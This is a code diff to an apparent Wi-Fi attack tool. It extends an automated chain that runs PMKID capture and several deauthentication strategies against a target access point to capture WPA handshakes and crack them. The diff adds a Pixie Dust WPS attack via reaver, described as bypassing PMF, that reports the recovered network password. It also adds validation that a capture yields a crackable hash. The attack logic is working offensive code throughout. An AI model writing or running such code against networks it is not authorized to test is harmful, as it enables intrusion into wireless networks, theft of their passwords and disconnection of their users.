@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import logging
 import time
+from pathlib import Path
 from typing import Callable, List, Optional, Tuple
 
 from wifi_launchpad.app.settings import get_settings
@@ -16,7 +17,6 @@ from wifi_launchpad.services.crack_service import CrackService
 
 logger = logging.getLogger(__name__)
 
-
 def _build_techniques():
     """Build technique list with timeouts from settings."""
     atk = get_settings().attack
@@ -25,8 +25,8 @@ def _build_techniques():
         ("deauth-broadcast", "Deauth broadcast", atk.deauth_broadcast_timeout),
         ("deauth-targeted", "Deauth per-client", atk.deauth_targeted_timeout),
         ("deauth-aggressive", "Deauth aggressive", atk.deauth_aggressive_timeout),
+        ("pixie-wps", "Pixie dust WPS (bypasses PMF)", 60),
     ]
-
 
 class AttackChain:
     """Persistent technique chain: PMKID → deauth strategies until captured."""
@@ -137,15 +137,34 @@ class AttackChain:
                 eapol_total += eapol_count
 
                 if success and handshake:
-                    result.captured = True
-                    result.handshake = handshake
-                    self.on_status(
-                        f"      {eapol_count} EAPOL packets — CAPTURED!"
-                    )
-                    break
+                    # Validate: try to export .22000 hash — if it fails,
+                    # the EAPOL pair is incomplete (e.g., M1+M3 without M2)
+                    hash_ok = self._validate_capture(handshake)
+                    if hash_ok:
+                        result.captured = True
+                        result.handshake = handshake
+                        self.on_status(f"      {eapol_count} EAPOL packets — CAPTURED!")
+                        break
+                    else:
+                        self.on_status(f"      {eapol_count} EAPOL packets (incomplete pair — not crackable)")
+                        continue
 
                 status_msg = f"      {eapol_count} EAPOL packets" if eapol_count else "      no EAPOL"
                 self.on_status(status_msg)
+
+            elif tech_id == "pixie-wps":
+                if not getattr(network, "wps_enabled", False):
+                    self.on_status("      WPS not detected — skipping pixie dust")
+                    continue
+                if getattr(network, "wps_locked", False):
+                    self.on_status("      WPS locked — skipping pixie dust")
+                    continue
+                pix_result = self._try_pixie(network)
+                if pix_result and pix_result.get("success"):
+                    result.captured = True
+                    self.on_status(f"      Pixie dust SUCCESS! PSK={pix_result.get('password', '?')}")
+                    break
+                self.on_status("      Pixie dust failed (AP not vulnerable)")
 
         result.total_time = time.time() - started
         result.eapol_packets_seen = eapol_total
@@ -182,17 +201,14 @@ class AttackChain:
             self._cleanup_stale_processes()
 
             if result.captured:
-                quality = result.handshake.quality_score if result.handshake else 0
-                method = result.handshake.capture_method if result.handshake else "?"
-                self.on_status(
-                    f"  >> CAPTURED ({method}, quality: {quality:.0f}/100, {result.total_time:.0f}s)"
-                )
-                if result.crack_result and result.crack_result.cracked:
-                    self.on_status(
-                        f"  >> CRACKED: {result.crack_result.password} ({result.crack_result.crack_time:.1f}s)"
-                    )
-                elif result.crack_result:
-                    self.on_status(f"  >> Not cracked ({result.crack_result.method})")
+                hs = result.handshake
+                q, m = (hs.quality_score, hs.capture_method) if hs else (0, "?")
+                self.on_status(f"  >> CAPTURED ({m}, quality: {q:.0f}/100, {result.total_time:.0f}s)")
+                cr = result.crack_result
+                if cr and cr.cracked:
+                    self.on_status(f"  >> CRACKED: {cr.password} ({cr.crack_time:.1f}s)")
+                elif cr:
+                    self.on_status(f"  >> Not cracked ({cr.method})")
             elif result.skipped:
                 self.on_status(f"  >> SKIPPED: {result.skip_reason}")
             else:
@@ -221,48 +237,55 @@ class AttackChain:
             logger.error("PMKID capture error: %s", exc)
             return False, None, None
 
-    def _try_deauth(
-        self,
-        network: Network,
-        client_macs: List[str],
-        strategy: DeauthStrategy,
-        timeout: int,
-    ) -> Tuple[bool, Optional[Handshake], int]:
+    def _try_deauth(self, network: Network, client_macs: List[str],
+                    strategy: DeauthStrategy, timeout: int) -> Tuple[bool, Optional[Handshake], int]:
         """Attempt deauth + handshake capture with native airodump/aireplay."""
-
         if strategy == DeauthStrategy.TARGETED and not client_macs:
             strategy = DeauthStrategy.BROADCAST
-        burst_specs = {
-            DeauthStrategy.AGGRESSIVE: (15, 2.0),
-            DeauthStrategy.TARGETED: (8, 4.0),
-        }
-        burst_count, burst_interval = burst_specs.get(strategy, (5, 5.0))
-        deauth_config = DeauthConfig(
-            strategy=strategy, burst_count=burst_count,
-            packet_count=10, burst_interval=burst_interval,
-        )
-
+        burst_count, burst_interval = {
+            DeauthStrategy.AGGRESSIVE: (15, 2.0), DeauthStrategy.TARGETED: (8, 4.0),
+        }.get(strategy, (5, 5.0))
         config = CaptureConfig(
-            target_bssid=network.bssid,
-            target_channel=network.channel,
-            target_ssid=network.ssid,
-            capture_timeout=timeout,
-            deauth_count=deauth_config.burst_count,
-            deauth_interval=int(deauth_config.burst_interval),
+            target_bssid=network.bssid, target_channel=network.channel,
+            target_ssid=network.ssid, capture_timeout=timeout,
+            deauth_count=burst_count, deauth_interval=int(burst_interval),
             deauth_client=client_macs[0] if client_macs and strategy == DeauthStrategy.TARGETED else None,
             min_quality_score=30.0,
         )
-
         manager = CaptureManager(self.injection_interface, self.injection_interface)
-
         try:
             success, handshake = manager.capture_handshake(config)
         except Exception as exc:
             logger.error("Deauth capture error: %s", exc)
             return False, None, 0
-
         eapol_count = handshake.eapol_packets if handshake else 0
         return success, handshake if success else None, eapol_count
+
+    def _try_pixie(self, network: Network) -> Optional[dict]:
+        """Attempt pixie dust WPS attack — bypasses PMF."""
+        try:
+            import asyncio
+            from wifi_launchpad.providers.external.reaver_wps import pixie_dust, is_available
+            if not is_available():
+                return None
+            loop = asyncio.new_event_loop()
+            result = loop.run_until_complete(
+                pixie_dust(self.injection_interface, network.bssid, network.channel, timeout=60)
+            )
+            loop.close()
+            if result.success:
+                return {"success": True, "pin": result.pin, "password": result.password}
+        except Exception as exc:
+            logger.debug("Pixie dust error: %s", exc)
+        return None
+
+    def _validate_capture(self, handshake: Handshake) -> bool:
+        """Check if capture produces a crackable .22000 hash file."""
+        try:
+            h = CrackService()._find_or_export_hash(handshake)
+            return h is not None and Path(h).exists()
+        except Exception:
+            return False
 
     def _try_crack(self, result: AttackTargetResult):
         """Attempt to crack a captured handshake."""
@@ -293,8 +316,7 @@ class AttackChain:
         pmkid_tried: bool, pmkid_success: bool,
     ) -> Tuple[bool, str]:
         """Decide whether to skip the current target."""
-        if round_num >= len(_build_techniques()):
-            return True, "exhausted"
-        if round_num >= 3 and eapol_count == 0:
-            return True, "pmf-likely"
+        total = len(_build_techniques())
+        if round_num >= total:
+            return True, "pmf-likely" if eapol_count == 0 else "exhausted"
         return False, ""
